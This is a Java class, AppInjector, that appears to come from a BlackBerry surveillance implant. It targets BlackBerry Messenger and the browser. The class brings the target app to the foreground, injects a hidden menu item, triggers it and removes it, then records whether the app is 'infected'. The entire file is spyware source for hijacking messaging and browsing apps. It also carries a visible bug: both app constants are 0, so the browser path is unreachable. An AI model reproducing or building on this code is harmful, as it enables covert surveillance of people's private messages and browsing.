package blackberry.injection;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import blackberry.agent.im.BBMMenuItem;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class AppInjector {
    public static final int APP_BBM = 0;
    public static final int APP_BROWSER = 0;
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppInjector", DebugLevel.VERBOSE);
    //#endif
    
    private AppInjectorInterface delegate;
    boolean infected;
    
    ApplicationManager manager = ApplicationManager.getApplicationManager();

    public AppInjector(int app) throws Exception {
        if (app == APP_BBM) {
            //#ifdef DEBUG
            debug.trace("AppInjector BBM");
            //#endif
            delegate= AppInjectorBBM.getInstance();
        } else if (app == APP_BROWSER) {
            //#ifdef DEBUG
            debug.trace("AppInjector BROWSER");
            //#endif
            delegate= AppInjectorBrowser.getInstance();
        } else {
            //#ifdef DEBUG
            debug.error("AppInjector, wrong value: " +app);
            //#endif
            throw new Exception();
        }
    }
    
    public boolean callMenuByKey() {
        //#ifdef DEBUG
        debug.trace("callMenu");
        //#endif
        
        final int foregroundProcess = manager.getForegroundProcessId();

        BBMMenuItem bbmMenu = BBMMenuItem.getInstance();

        // debug.trace("searching Messenger or Browser");
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {

            if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
                if (manager.getProcessId(apps[i]) == foregroundProcess) {
                    infected = delegate.callMenuByKey();
                }
            }
        }
        return false;
    }
    
    public boolean isInfected() {
        
        boolean infected = delegate.isInfected();
        //#ifdef DEBUG
        debug.trace("isInfected: "+infected);
        //#endif
        return infected;
    }

    public void callMenuInContext() {
        //#ifdef DEBUG
        debug.trace("callInContext");
        //#endif
        delegate.callMenuInContext();
        
    }

    public boolean infect() {
        delegate.requestForeground();
        delegate.injectMenu();
        callMenuByKey();
        delegate.deleteMenu();
        
        return infected;
    }


}
